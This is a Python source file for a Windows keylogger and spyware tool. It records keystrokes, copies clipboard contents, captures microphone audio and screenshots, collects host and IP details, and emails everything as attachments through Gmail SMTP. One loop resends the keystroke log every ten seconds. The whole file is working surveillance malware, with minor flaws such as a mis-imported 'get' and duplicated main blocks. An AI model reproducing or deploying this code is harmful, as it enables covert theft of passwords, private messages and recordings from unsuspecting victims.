import smtplib
from webbrowser import get

email_address = "enter_your_email"
password = "enter your password"
try:
    print("Connecting to SMTP server...")
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    print("Connection successful. Logging in...")
    server.login(email_address, password)
    print("Logged in successfully.")
    server.quit()
except Exception as e:
    print(f"SMTP connection test failed: {e}")

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import platform
import win32clipboard
import time
import os
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab

# File paths and settings
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

file_path = "your files path"
extend = "\\"

email_address = "enter_your_email"  # Replace with your email address
password = "enter your password"  # Replace with your app-specific password (if using Gmail)
toaddr = "enter_your_email"  # Replace with recipient's email address


# Function to send an email with multiple attachments
def send_email_with_attachments(subject, body, attachments):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    # Attach the body of the email as plain text
    msg.attach(MIMEText(body, 'plain'))

    # Attach each file in the attachments list
    for filename in attachments:
        attachment_path = file_path + extend + filename
        try:
            with open(attachment_path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {filename}")
                msg.attach(part)
        except Exception as e:
            print(f"Failed to attach {filename}: {e}")

    # Send the email via SMTP server (Gmail example)
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


# Function to gather computer information and save it to a file
def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')


# Function to copy clipboard content and save it to a file
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data)
        except Exception:
            f.write("Clipboard option not working")


# Function to record audio from microphone and save it as a .wav file
def microphone():
    fs = 44100  # Sample rate
    seconds = 10  # Duration of recording in seconds
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(file_path + extend + audio_information, fs, myrecording)


# Function to take a screenshot and save it as an image file
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


# Keylogger functions (on_press and on_release)
keys = []
count = 0


def on_press(key):
    global keys, count

    print(key)  # For debugging purposes (optional)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
def clear_keystroke_log():
    with open(file_path + extend + keys_information, "w") as f:
        f.write("")  # Clear the contents of the file

# Main function to gather all information and send it in one email
def main():
    print("Starting keylogger...")

    # Start keylogger listener in background thread.
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    print("Gathering system information...")
    computer_information()

    print("Copying clipboard data...")
    copy_clipboard()

    print("Recording audio from microphone...")
    microphone()

    print("Taking screenshot...")
    screenshot()

    # List of files to attach to the email (all gathered information including keylogger data)
    attachments = [system_information, clipboard_information, audio_information, screenshot_information,
                   keys_information]

    # Send all gathered information in one email with multiple attachments
    subject = "System Information and Logs"
    body = "Please find attached the system information, clipboard data, audio recording, screenshot, and keylog."

    print("Attempting to send all information in one email...")

    send_email_with_attachments(subject, body, attachments)


if __name__ == "__main__":
    main()


def main1():
    print("Starting keylogger...")

    # Start listening for keystrokes in a separate thread.
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    try:
        while True:
            time.sleep(10)  # Wait for 10 seconds before sending the next batch of keystrokes

            # Send keystroke log via email every 10 seconds
            print("Attempting to send keystroke log...")
            send_email_with_attachments(
                subject="Keystroke Log",
                body="Please find attached the latest keystroke log.",
                attachments=[keys_information]
            )


    except KeyboardInterrupt:
        listener.stop()  # Stop listener if interrupted (optional)


if __name__ == "__main__":
    main1()
